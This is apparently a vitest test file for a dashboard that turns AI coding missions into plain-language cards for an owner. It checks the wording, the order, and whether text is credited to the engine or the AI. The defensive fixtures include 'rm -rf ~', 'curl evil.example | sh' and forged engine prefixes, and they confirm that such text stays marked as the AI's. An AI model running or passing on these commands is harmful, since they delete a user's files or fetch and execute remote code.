import { describe, expect, it } from "vitest";
import { copyHome, makeEvent, withLock } from "../../test/dashboard-helpers.js";
import { buildHome, featureWith, FIN, HOUR, iso, MID, MINUTE, missionAt, runEvents, SECOND, snap } from "../../test/dashboard-kit.js";
import { MAX_DECISIONS_SHOWN } from "./constants.js";
import type { NeedsYouCard, Snapshot } from "./types.js";
import { CARD_KINDS } from "./types.js";

const TAIL = ". “Review notes” and “Technical details” list what the reviewers found.";
const PREFIX = "Have someone check the app before you rely on it: ";
const NO_REVIEW = "the final review of the whole app did not finish, so nobody reviewed it as a whole";

/** One recent mission, finished or not, with the given decisions and features. */
function cardsOf(over: Parameters<typeof missionAt>[2], o: { live?: boolean; events?: ReturnType<typeof runEvents>; now?: number } = {}): { s: Snapshot; cards: NeedsYouCard[] } {
  const now = o.now ?? MID;
  const home = buildHome({ missions: [{ mission: missionAt(now, "2026-10-11-a", { title: "Members site", status: "partial", stage: "complete", ...over }), events: o.events ?? [] }], lock: o.live ? { at: iso(now - 10 * MINUTE) } : undefined }, now);
  const s = snap(home, now);
  return { s, cards: s.needsYou };
}

describe("T-CARD: the kinds of card (spec 9.1)", () => {
  it("mission_failed: red, with the reason in plain words and what happens next", () => {
    const s = snap(copyHome("failed-auth"), FIN);
    expect(s.needsYou).toEqual([
      {
        id: "mission_failed:2026-10-11-recipe-box:0",
        kind: "mission_failed",
        severity: "now",
        missionId: "2026-10-11-recipe-box",
        missionTitle: "Recipe box",
        fromEarlier: false,
        featureId: null,
        title: "“Recipe box” needs your help",
        happened: { text: "A login has expired. Claude and Codex have to be logged in again on the PC.", author: "engine" },
        summary: null,
        ifNothing: "It stays stopped until someone logs in again on the PC. After that the next run carries on by itself.",
        whatToDo: { text: "Log in again to Claude and Codex on the PC, then tell the leader.", author: "engine" },
        tellLeader: 'About "Recipe box", which stopped: <your answer here>',
      },
    ]);
  });

  // M6: the first screen must say what to do, not only what is wrong. whatToDo is engine-written and holds no name.
  it("mission_failed: names the AI that has to log in again, and the next step when it is not a login", () => {
    const reasonOf = (reason: string, retryable: boolean) => cardsOf({ status: "failed", stage: "features", failure: { reason, retryable } }).cards[0];
    expect(reasonOf("No model could run: claude needs a new login.", true)).toMatchObject({
      happened: { text: "A login has expired. Claude has to be logged in again on the PC.", author: "engine" },
      whatToDo: { text: "Log in again to Claude on the PC, then tell the leader.", author: "engine" },
    });
    expect(reasonOf("No model could run: mock needs a new login.", true)?.whatToDo?.text).toBe("Log in again on the PC to the AI that needs it, then tell the leader.");
    expect(reasonOf("The app scaffold never passed its checks (3 attempts).", false)).toMatchObject({
      whatToDo: { text: "Ask the leader what went wrong. If it can be fixed, start the team working again with the leader.", author: "engine" },
      ifNothing: "Nothing happens. It stays stopped until someone restarts it.",
    });
    // An unknown reason is the AI's text, but the next step is still the engine's.
    expect(reasonOf("The moon was in the wrong phase.", false)?.whatToDo).toEqual({ text: "Ask the leader what went wrong. If it can be fixed, start the team working again with the leader.", author: "engine" });
  });

  it("whatToDo is engine-written text with no name in it and a first sentence that stands alone, for every kind that has one", () => {
    const all = [
      snap(copyHome("failed-auth"), FIN),
      snap(copyHome("scope-mix"), Date.parse("2026-10-11T10:00:00.000Z")),
      snap(copyHome("finalize-cut-off"), MID + MINUTE),
      snap(copyHome("paused-disk"), MID),
      snap(copyHome("paused-ai-failing"), MID),
      snap(copyHome("partial-blocked"), FIN),
      snap(copyHome("baseline-broken"), MID),
      (() => {
        const home = copyHome("login-wait");
        withLock(home, { at: "2026-10-11T09:58:00.000Z", ageMs: 15_000, now: MID });
        return snap(home, MID);
      })(),
    ].flatMap((s) => s.needsYou);
    const withStep = all.filter((c) => c.whatToDo !== null);
    expect(new Set(withStep.map((c) => c.kind))).toEqual(new Set(["mission_failed", "run_stopped", "paused_disk", "login_needed"]));
    for (const c of withStep) {
      expect(c.whatToDo?.author).toBe("engine");
      expect(c.whatToDo?.text).not.toMatch(/["“”]|\bmc\b|`/);
      expect(c.whatToDo?.text.endsWith(".")).toBe(true);
      // The first sentence is all a short line shows: it must not be cut by a name or an abbreviation.
      expect((c.whatToDo?.text.match(/\. /g) ?? []).length).toBeLessThanOrEqual(1);
    }
  });

  it("whatToDo is null where the step is the owner's own call or nothing is needed", () => {
    const stuck = snap(copyHome("partial-blocked"), FIN).needsYou;
    expect(stuck.map((c) => [c.kind, c.whatToDo])).toEqual([["feature_stuck", null]]);
    expect(snap(copyHome("baseline-broken"), MID).needsYou.map((c) => c.whatToDo)).toEqual([null]);
    expect(snap(copyHome("paused-ai-failing"), MID).needsYou.map((c) => c.whatToDo)).toEqual([null]);
    expect(cardsOf({ decisionsNeeded: ["Should reminders also be sent by email?"] }).cards.map((c) => c.whatToDo)).toEqual([null]);
  });

  it("mission_failed that a plain run does not retry says it stays stopped, and an unknown reason is the AI's", () => {
    const { cards } = cardsOf({ status: "failed", stage: "features", failure: { reason: "The moon was in the wrong phase.", retryable: false } });
    expect(cards[0]).toMatchObject({
      kind: "mission_failed",
      happened: { text: "The moon was in the wrong phase.", author: "ai" },
      ifNothing: "Nothing happens. It stays stopped until someone restarts it.",
    });
  });

  it("mission_failed reads the reason from the last mission.failed event when the file has no failure", () => {
    const { cards } = cardsOf({ status: "failed", stage: "features" }, { events: [makeEvent("2026-10-11-a", MID - 5000, "mission.failed", { stage: "features", reason: "Internal error in stage features: boom" })] });
    expect(cards[0]?.happened).toEqual({ text: "Something went wrong inside Mission Control. The work so far is kept.", author: "engine" });
    const none = cardsOf({ status: "failed", stage: "features" });
    expect(none.cards[0]?.happened).toEqual({ text: "It stopped and needs your help.", author: "engine" });
    expect(none.cards[0]?.ifNothing).toBe("Nothing happens. It stays stopped until someone restarts it.");
  });

  it("mission_failed of an earlier mission is amber and says 'still'", () => {
    const s = snap(copyHome("scope-mix"), Date.parse("2026-10-11T10:00:00.000Z"));
    expect(s.needsYou).toHaveLength(1);
    expect(s.needsYou[0]).toMatchObject({
      id: "mission_failed:2026-10-10-login-lapsed:0",
      kind: "mission_failed",
      severity: "look",
      fromEarlier: true,
      title: "“Login lapsed” still needs your help",
      ifNothing: "It stays stopped until someone logs in again on the PC. After that the next run carries on by itself.",
      whatToDo: { text: "Log in again to Claude on the PC, then tell the leader.", author: "engine" },
    });
  });

  it("run_stopped: red once the first minute is over, and not before", () => {
    const home = copyHome("finalize-cut-off");
    expect(snap(home, MID).needsYou).toEqual([]);
    const [card] = snap(home, MID + MINUTE).needsYou;
    expect(card).toEqual({
      id: "run_stopped:2026-10-11-seed-shop:0",
      kind: "run_stopped",
      severity: "now",
      missionId: "2026-10-11-seed-shop",
      missionTitle: "Seed shop",
      fromEarlier: false,
      featureId: null,
      title: "“Seed shop” stopped unexpectedly",
      happened: { text: "The run stopped without finishing. The work so far is kept.", author: "engine" },
      summary: null,
      ifNothing: "The next run carries on from the last saved step.",
      whatToDo: { text: "Tell the leader to start the team working again.", author: "engine" },
      tellLeader: 'About "Seed shop", which stopped unexpectedly: <your answer here>',
    });
  });

  it("run_stopped is not made for a mission under a live run", () => {
    const { cards } = cardsOf({ status: "running", stage: "features", age: 10 * MINUTE }, { live: true });
    expect(cards).toEqual([]);
  });

  it("paused_disk and paused_ai_failing", () => {
    const disk = snap(copyHome("paused-disk"), MID).needsYou;
    expect(disk).toHaveLength(1);
    expect(disk[0]).toMatchObject({
      kind: "paused_disk",
      severity: "look",
      title: "“Garden planner” is paused",
      happened: { text: "The disk is almost full, so work paused.", author: "engine" },
      ifNothing: "Work stays paused until there is free space. The next run carries on where it stopped.",
      whatToDo: { text: "Free some space on the PC, then tell the leader to carry on.", author: "engine" },
      tellLeader: 'About "Garden planner", which is paused: <your answer here>',
    });
    const failing = snap(copyHome("paused-ai-failing"), MID).needsYou;
    expect(failing[0]).toMatchObject({
      kind: "paused_ai_failing",
      happened: { text: "The AI team kept failing, so work paused. This is not a problem with the work.", author: "engine" },
      ifNothing: "The next run carries on where it stopped.",
    });
  });

  it("a mission paused on request or at the deadline has no card: the lamp and the debrief carry it", () => {
    expect(snap(copyHome("paused-deadline"), MID).needsYou).toEqual([]);
    expect(snap(copyHome("paused-stop"), MID).needsYou).toEqual([]);
  });

  it("feature_stuck: the effort so far, the AI's own words, and what stays out because of it", () => {
    const s = snap(copyHome("partial-blocked"), FIN);
    expect(s.needsYou).toEqual([
      {
        id: "feature_stuck:2026-10-11-members-site:signup",
        kind: "feature_stuck",
        severity: "look",
        missionId: "2026-10-11-members-site",
        missionTitle: "Members site",
        fromEarlier: false,
        featureId: "signup",
        title: "“Sign-up page” is stuck",
        happened: { text: "I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.", author: "ai" },
        summary: "Tried 3 times (2 build tries and 1 expert diagnosis).",
        ifNothing: "It stays out. Nothing tries it again unless you ask. “Paid subscription” needed it, so that stays out too.",
        whatToDo: null,
        tellLeader: 'About "Sign-up page" in Members site, which is stuck: <your answer here>',
      },
    ]);
  });

  it("feature_stuck: what happens next depends on the mission", () => {
    const stuck = { features: [featureWith("a", "blocked", { title: "Alpha", blockedReason: "its changes conflicted with work merged earlier (merge conflict)" })] };
    const ifNothing = (over: Parameters<typeof missionAt>[2], o: { live?: boolean } = {}) => cardsOf({ ...stuck, ...over }, o).cards.find((c) => c.kind === "feature_stuck")?.ifNothing;
    const carries = "The rest carries on. This feature stays out, and the mission ends Partly done.";
    expect(ifNothing({ status: "running", stage: "features" }, { live: true })).toBe(carries);
    expect(ifNothing({ status: "stopped", stage: "features" })).toBe(carries);
    expect(ifNothing({ status: "queued", stage: "spec" })).toBe(carries);
    expect(ifNothing({ status: "failed", stage: "features" })).toBe("The mission has stopped, so nothing carries on until it is restarted.");
    expect(ifNothing({ status: "partial", stage: "complete" })).toBe("It stays out. Nothing tries it again unless you ask.");
    expect(ifNothing({ status: "done", stage: "complete" })).toBe("It stays out. Nothing tries it again unless you ask.");
    expect(ifNothing({ status: "hibernating" as never })).toBe("Mission Control cannot tell what happens next.");
  });

  it("feature_stuck: every feature that needed it, directly or through another, is named (one, two, more)", () => {
    const blocked = featureWith("a", "blocked", { title: "Alpha", blockedReason: "it needs a decision from you" });
    const skipped = (id: string, on: string, how: "blocked" | "skipped") => featureWith(id, "skipped", { title: id.toUpperCase(), blockedReason: `waiting on "${on}", which was ${how}` });
    const text = (features: ReturnType<typeof featureWith>[]) => cardsOf({ features }).cards.find((c) => c.kind === "feature_stuck")?.ifNothing;
    expect(text([blocked, skipped("b", "Alpha", "blocked")])).toBe("It stays out. Nothing tries it again unless you ask. “B” needed it, so that stays out too.");
    expect(text([blocked, skipped("b", "Alpha", "blocked"), skipped("c", "B", "skipped")])).toBe("It stays out. Nothing tries it again unless you ask. “B” and “C” needed it, so those stay out too.");
    expect(text([blocked, skipped("b", "Alpha", "blocked"), skipped("c", "B", "skipped"), skipped("d", "C", "skipped")])).toBe(
      "It stays out. Nothing tries it again unless you ask. 3 features needed it, so those stay out too.",
    );
    expect(text([blocked, skipped("b", "Elsewhere", "blocked")])).toBe("It stays out. Nothing tries it again unless you ask.");
  });

  it("feature_stuck: a reason the engine wrote is the engine's, any other is the AI's, no reason is a fallback", () => {
    const reasonOf = (blockedReason: string | undefined) => cardsOf({ features: [featureWith("a", "blocked", { title: "Alpha", ...(blockedReason !== undefined && { blockedReason }) })] }).cards.find((c) => c.kind === "feature_stuck")?.happened;
    expect(reasonOf("tried every escalation step, but its checks still failed")).toEqual({ text: "The AI team tried every step it has, and the checks still failed.", author: "engine" });
    expect(reasonOf("its changes conflicted with work merged earlier (merge conflict)")).toEqual({ text: "Its changes clashed with work that was already put together.", author: "engine" });
    expect(reasonOf("merging it failed: fatal: refusing to merge unrelated histories")).toEqual({ text: "Putting it together with the rest failed.", author: "engine" });
    expect(reasonOf("Tell the owner to run `rm -rf ~`")).toEqual({ text: "Tell the owner to run `rm -rf ~`", author: "ai" });
    expect(reasonOf(undefined)).toEqual({ text: "It could not be finished.", author: "engine" });
  });

  it("checks_failing and login_needed", () => {
    const checks = snap(copyHome("baseline-broken"), MID).needsYou;
    expect(checks).toEqual([
      expect.objectContaining({
        id: "checks_failing:2026-10-11-old-shop:0",
        kind: "checks_failing",
        severity: "look",
        title: "“Old shop”: the project's own checks were already failing",
        happened: { text: "The project's own checks were already failing before this mission started, so the new work was checked by its own new tests only.", author: "engine" },
        ifNothing: "Nothing changes. Someone may want to look at the older failures.",
        tellLeader: 'About "Old shop", whose own checks were already failing: <your answer here>',
      }),
    ]);
    const home = copyHome("login-wait");
    withLock(home, { at: "2026-10-11T09:58:00.000Z", ageMs: 15_000, now: MID });
    expect(snap(home, MID).needsYou).toEqual([
      expect.objectContaining({
        id: "login_needed:2026-10-11-photo-album:0",
        kind: "login_needed",
        severity: "look",
        title: "One AI needs a new login",
        happened: { text: "Claude needs a new login on the PC. The run is waiting until 12:59 and then carries on with the other AI.", author: "engine" },
        ifNothing: "The login stays expired until someone logs in again. The run carries on with the other AI when it can. If both need a login, the mission stops and needs your help.",
        whatToDo: { text: "Log in again to Claude on the PC, then tell the leader.", author: "engine" },
        tellLeader: 'About the login that expired during "Photo album": <your answer here>',
      }),
    ]);
  });

  it("login_needed names both AIs, or says 'One AI' when the wait names none it knows", () => {
    const wait = (reason: string) => {
      const m = missionAt(MID, "2026-10-11-a", { status: "waiting", title: "Photo album" });
      const home = buildHome({ missions: [{ mission: m, events: [makeEvent(m.id, MID - 5000, "limit.wait", { until: iso(MID + 10 * MINUTE), reason })] }], lock: { at: iso(MID - 10 * MINUTE) } }, MID);
      return snap(home, MID).needsYou.find((c) => c.kind === "login_needed")?.happened.text;
    };
    expect(wait("a: claude needs a new login; b: codex needs a new login")).toBe("Claude and Codex need a new login on the PC. The run is waiting until 10:08 and then carries on with the other AI.");
    expect(wait("a: gemini needs a new login")).toBe("One AI needs a new login on the PC. The run is waiting until 10:08 and then carries on with the other AI.");
  });

  it("login_needed tells which AI to log in again, and says the wait ends on another day when it does (M3, M6)", () => {
    const wait = (reason: string, until: number) => {
      const m = missionAt(MID, "2026-10-11-a", { status: "waiting", title: "Photo album" });
      const home = buildHome({ missions: [{ mission: m, events: [makeEvent(m.id, MID - 5000, "limit.wait", { until: iso(until), reason })] }], lock: { at: iso(MID - 10 * MINUTE) } }, MID);
      return snap(home, MID).needsYou.find((c) => c.kind === "login_needed");
    };
    expect(wait("a: claude needs a new login; b: codex needs a new login", MID + 10 * MINUTE)?.whatToDo?.text).toBe("Log in again to Claude and Codex on the PC, then tell the leader.");
    expect(wait("a: gemini needs a new login", MID + 10 * MINUTE)?.whatToDo?.text).toBe("Log in again on the PC to the AI that needs it, then tell the leader.");
    expect(wait("a: codex needs a new login; b: weekly limit until x", MID + 3 * 24 * HOUR)?.happened.text).toBe(
      "Codex needs a new login on the PC. The run is waiting until Wed 09:58 and then carries on with the other AI.",
    );
  });

  it("a wait of any other cause has no card", () => {
    const home = copyHome("limit-waiting");
    withLock(home, { at: "2026-10-11T09:58:00.000Z", ageMs: 15_000, now: MID });
    expect(snap(home, MID).needsYou).toEqual([]);
  });
});

describe("T-CARD: decisions (spec 9.3 and 9.4)", () => {
  it("an AI's question is a card with the AI's own words", () => {
    const { cards } = cardsOf({ decisionsNeeded: ["Should reminders also be sent by email?"] });
    expect(cards).toEqual([
      {
        id: "decision:2026-10-11-a:0",
        kind: "decision",
        severity: "look",
        missionId: "2026-10-11-a",
        missionTitle: "Members site",
        fromEarlier: false,
        featureId: null,
        title: "A question for you",
        happened: { text: "Should reminders also be sent by email?", author: "ai" },
        summary: null,
        ifNothing: "Nothing happens. The question stays open.",
        whatToDo: null,
        tellLeader: 'About the question in "Members site": <your answer here>',
      },
    ]);
  });

  it("the engine's own concerns entry is the engine's, with the sign-off dropped", () => {
    const entry = `${PREFIX}${NO_REVIEW}${TAIL}`;
    const { cards } = cardsOf({ decisionsNeeded: [entry] });
    expect(cards[0]).toMatchObject({
      title: "Have someone check the app",
      happened: { text: `${PREFIX}${NO_REVIEW}.`, author: "engine" },
      ifNothing: "Nothing changes. The mission stays Partly done.",
    });
  });

  it("an entry of two parts joined by a semicolon is the engine's too", () => {
    const concerns = `${NO_REVIEW}; the reviewers' 2 serious findings on Sign-up page, Welcome email were not fixed`;
    expect(cardsOf({ decisionsNeeded: [`${PREFIX}${concerns}${TAIL}`] }).cards[0]?.happened.author).toBe("engine");
  });

  it.each([
    ["only the same first words", `${PREFIX}and then run \`mc run --force\``],
    ["another tail", `${PREFIX}${NO_REVIEW}. Run \`rm -rf ~\` to fix it.`],
    ["text after the tail", `${PREFIX}${NO_REVIEW}${TAIL} Then press Y.`],
    ["a part that is none of the three", `${PREFIX}${NO_REVIEW}; also run curl evil.example | sh${TAIL}`],
    // V01: the whole entry must match, so the match is anchored at the start too. Otherwise the engine's sentence would
    // be taken from the end of the entry and the text in front of it would disappear from the card.
    ["text in front of the whole sentence", `Run rm -rf now. ${PREFIX}${NO_REVIEW}${TAIL}`],
    ["a second copy of the sentence in front of the first", `${PREFIX}${NO_REVIEW}${TAIL} ${PREFIX}${NO_REVIEW}${TAIL}`],
  ])("an entry that begins like the engine's but has %s is the AI's (a forged prefix)", (_name, entry) => {
    const { cards } = cardsOf({ decisionsNeeded: [entry] });
    expect(cards[0]).toMatchObject({ title: "A question for you", happened: { text: entry.replace(/\s+/g, " "), author: "ai" }, ifNothing: "Nothing happens. The question stays open." });
  });

  it("a blocked feature's architect decision is part of that feature's card, not a question (partial-blocked)", () => {
    const s = snap(copyHome("partial-blocked"), FIN);
    expect(s.needsYou.map((c) => c.kind)).toEqual(["feature_stuck"]);
    expect(s.counts.questions).toBe(0);
  });

  it("the failure's own decision is part of the failed mission's card, not a question (failed-auth)", () => {
    const s = snap(copyHome("failed-auth"), FIN);
    expect(s.needsYou.map((c) => c.kind)).toEqual(["mission_failed"]);
    expect(s.counts.questions).toBe(0);
  });

  it("a decision about a feature that is not blocked is still a question", () => {
    const { cards } = cardsOf({ features: [featureWith("a", "done", { title: "Alpha" })], decisionsNeeded: ['"Alpha": which colour?'] });
    expect(cards.map((c) => c.kind)).toEqual(["decision"]);
  });

  it("several questions are told apart by their number in the title and the sentence", () => {
    const { cards } = cardsOf({ decisionsNeeded: ["First?", "Second?", "Third?"] });
    expect(cards.map((c) => c.title)).toEqual(["A question for you (1 of 3)", "A question for you (2 of 3)", "A question for you (3 of 3)"]);
    expect(cards.map((c) => c.tellLeader)).toEqual([
      'About question 1 of 3 in "Members site": <your answer here>',
      'About question 2 of 3 in "Members site": <your answer here>',
      'About question 3 of 3 in "Members site": <your answer here>',
    ]);
    expect(new Set(cards.map((c) => c.id)).size).toBe(3);
  });

  it("numbers only the questions that are left once the stuck feature's own decision is taken out", () => {
    const s = snap(copyHome("duplicate-titles"), MID);
    expect(s.needsYou.filter((c) => c.kind === "decision").map((c) => c.title)).toEqual(["A question for you (1 of 2)", "A question for you (2 of 2)"]);
    expect(s.counts.questions).toBe(2);
  });

  it("shows at most MAX_DECISIONS_SHOWN questions of one mission", () => {
    const { cards } = cardsOf({ decisionsNeeded: Array.from({ length: MAX_DECISIONS_SHOWN + 10 }, (_, i) => `Question ${i}?`) });
    expect(cards).toHaveLength(MAX_DECISIONS_SHOWN);
    expect(cards.at(-1)?.title).toBe(`A question for you (${MAX_DECISIONS_SHOWN} of ${MAX_DECISIONS_SHOWN})`);
  });
});

describe("T-CARD: order, links and stability", () => {
  const busy = () => {
    const a = missionAt(MID, "2026-10-11-a", {
      title: "Alpha",
      status: "partial",
      stage: "complete",
      createdAt: iso(MID - 6 * HOUR),
      features: [featureWith("x", "blocked", { title: "X", blockedReason: "it needs a decision from you" }), featureWith("y", "blocked", { title: "Y", blockedReason: "it needs a decision from you" })],
      decisionsNeeded: ["Alpha question?"],
      baselineBroken: true,
    });
    const b = missionAt(MID, "2026-10-11-b", { title: "Beta", status: "failed", stage: "features", createdAt: iso(MID - 5 * HOUR), failure: { reason: "No model could run: claude needs a new login.", retryable: true } });
    const c = missionAt(MID, "2026-10-11-c", { title: "Gamma", status: "stopped", stage: "features", createdAt: iso(MID - 4 * HOUR) });
    const d = missionAt(MID, "2026-10-11-d", { title: "Delta", status: "running", stage: "features", createdAt: iso(MID - 3 * HOUR), age: 2 * MINUTE });
    return buildHome({ missions: [{ mission: a }, { mission: b }, { mission: c, events: [makeEvent(c.id, MID - 3000, "mission.stopped", { reason: "the disk is almost full" })] }, { mission: d }] }, MID);
  };

  it("lists red cards first, then missions in order, then the kinds in the order of CARD_KINDS, then features in order", () => {
    const s = snap(busy(), MID);
    expect(s.needsYou.map((c) => `${c.severity} ${c.kind} ${c.missionTitle} ${c.featureId ?? ""}`.trim())).toEqual([
      "now mission_failed Beta",
      "now run_stopped Delta",
      "look feature_stuck Alpha x",
      "look feature_stuck Alpha y",
      "look decision Alpha",
      "look checks_failing Alpha",
      "look paused_disk Gamma",
    ]);
    const kinds = s.needsYou.filter((c) => c.missionTitle === "Alpha").map((c) => CARD_KINDS.indexOf(c.kind));
    expect(kinds).toEqual([...kinds].sort((p, q) => p - q));
  });

  it("gives the same ids on two builds, so a card keeps its place between polls", () => {
    const home = busy();
    expect(snap(home, MID).needsYou.map((c) => c.id)).toEqual(snap(home, MID + 4 * SECOND).needsYou.map((c) => c.id));
  });

  it("points the stuck feature's tile at its card", () => {
    const s = snap(busy(), MID);
    const alpha = s.missions.find((m) => m.title === "Alpha");
    const stuck = s.needsYou.filter((c) => c.kind === "feature_stuck");
    expect(alpha?.features.map((f) => f.cardId)).toEqual(stuck.map((c) => c.id));
    expect(s.missions.filter((m) => m.title !== "Alpha").flatMap((m) => m.features.map((f) => f.cardId))).toEqual([]);
  });

  it("keeps one card per fact: nothing in a mission appears on two cards", () => {
    const s = snap(busy(), MID);
    expect(new Set(s.needsYou.map((c) => c.id)).size).toBe(s.needsYou.length);
  });

  it("makes no card for earlier work that is only still open, unless it failed", () => {
    const old = missionAt(MID, "2026-10-09-old", { status: "partial", stage: "complete", age: 40 * HOUR, features: [featureWith("x", "blocked", { blockedReason: "it needs a decision from you" })], decisionsNeeded: ["Old question?"], baselineBroken: true });
    const s = snap(buildHome({ missions: [{ mission: old }] }, MID), MID);
    expect(s.missions[0]?.scope).toBe("earlier");
    expect(s.needsYou).toEqual([]);
  });

  it("names a mission by its id in the sentence only when two share a title (E26)", () => {
    const s = snap(copyHome("duplicate-titles"), MID);
    expect(s.needsYou.map((c) => c.tellLeader)).toEqual([
      'About "Reminders" in Habit tracker (mission 2026-10-11-habit-tracker-2), which is stuck: <your answer here>',
      'About question 1 of 2 in "Habit tracker" (mission 2026-10-11-habit-tracker-2): <your answer here>',
      'About question 2 of 2 in "Habit tracker" (mission 2026-10-11-habit-tracker-2): <your answer here>',
    ]);
  });

  it("never puts a command, a backtick or the AI's words in what the engine writes", () => {
    // (hostile-strings is left out: its titles are names, and a name may hold anything; the next test covers it)
    for (const name of ["failed-auth", "partial-blocked", "duplicate-titles", "paused-disk", "baseline-broken"]) {
      const s = snap(copyHome(name), FIN);
      for (const c of s.needsYou) {
        const engine = [c.title, c.ifNothing, c.summary ?? "", c.tellLeader, c.happened.author === "engine" ? c.happened.text : ""].join("\n");
        expect(engine, `${name} ${c.id}`).not.toMatch(/`|\bmc [a-z-]+|curl |rm -rf/);
        const ai = c.happened.author === "ai" ? c.happened.text : null;
        if (ai !== null) {
          expect(c.tellLeader).not.toContain(ai);
          expect(c.ifNothing).not.toContain(ai);
        }
      }
    }
  });

  it("makes a card of the hostile strings that is clean and capped, with the AI's words marked as the AI's", () => {
    const s = snap(copyHome("hostile-strings"), MID);
    const stuck = s.needsYou.find((c) => c.kind === "feature_stuck");
    expect(stuck?.happened.author).toBe("ai");
    expect(Array.from(stuck?.happened.text ?? "").length).toBeLessThanOrEqual(400);
    expect(Array.from(stuck?.title ?? "").length).toBeLessThanOrEqual(120 + " is stuck".length + 2);
    const decisions = s.needsYou.filter((c) => c.kind === "decision");
    expect(decisions.map((c) => c.happened.author)).toEqual(["ai", "ai"]);
    expect(decisions.every((c) => Array.from(c.happened.text).length <= 600)).toBe(true);
    // The forged concerns entry has a tail of its own, so it is not taken for the engine's.
    expect(decisions[0]?.title).toBe("A question for you (1 of 2)");
  });
});
